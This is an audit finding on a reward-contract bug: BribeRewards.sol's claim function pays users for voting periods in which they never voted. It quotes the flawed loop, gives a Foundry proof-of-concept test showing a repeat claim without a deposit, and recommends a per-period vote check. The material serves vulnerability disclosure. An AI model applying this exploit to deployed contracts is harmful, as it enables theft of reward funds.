# BribeRewards.sol#claim - Users can claim rewards for periods they haven't voted

## Summary
Users can claim rewards for periods they haven't voted.

## Vulnerability Detail
When a user votes, the amount he votes is deposited into the bribe rewarder. Later, when the period in which he votes is over, he can claim his rewards for voting using `claim` function.

`claim` function gets the latest finished period and loops thought all finished periods and calls `_modify` to claim the reward for each period. Users should have rewards **ONLY** for periods they have voted. However, there is no check if the user voted in the period, for which they call `_modify`. User needs to deposit for only one period and he gets a reward for every future period.
```js
 function claim(uint256 tokenId) external override {
        uint256 endPeriod = IVoter(_caller).getLatestFinishedPeriod();

        uint256 totalAmount;

        // calc emission per period cause every period can every other durations
        for (uint256 i = _startVotingPeriod; i <= endPeriod; ++i) {
            totalAmount += _modify(i, tokenId, 0, true);
        }

        emit Claimed(tokenId, _pool(), totalAmount);
    }

```

## PoC
Paste the following test inside `test/BribeRewarder.t.sol`
```js
  function testClaimRewards() public {
        ERC20Mock(address(rewardToken)).mint(address(this), 50e18);
        ERC20Mock(address(rewardToken)).approve(address(rewarder), 50e18);
        rewarder.fundAndBribe(1, 3, 10e18);

        // period 1
        _voterMock.setCurrentPeriod(1);
        _voterMock.setStartAndEndTime(block.timestamp, block.timestamp + 14 days);

        // Alice deposit in this period, meaning she voted
        vm.prank(address(_voterMock));
        vm.warp(block.timestamp + 5 days);
        rewarder.deposit(1, 1, 0.2e18);

        _voterMock.setLatestFinishedPeriod(1);

        vm.warp(block.timestamp + 15 days);

        // Alice gets her reward
        vm.prank(alice);
        rewarder.claim(1);
        assertEq(6428571428570831999, rewardToken.balanceOf(alice));

        // period 2
        _voterMock.setCurrentPeriod(2);
        _voterMock.setStartAndEndTime(block.timestamp, block.timestamp + 14 days);
        vm.warp(block.timestamp + 15 days);
        _voterMock.setLatestFinishedPeriod(2);

        // Alice claims again even though she hasn't depostied
        vm.prank(alice);
        rewarder.claim(1);
        assertEq(16428571428569903999, rewardToken.balanceOf(alice));
    }

```

## Recommendation
Before calling `_modify` in the for loop, first check if the user has voted in this period, if yes, then call `_modify`.
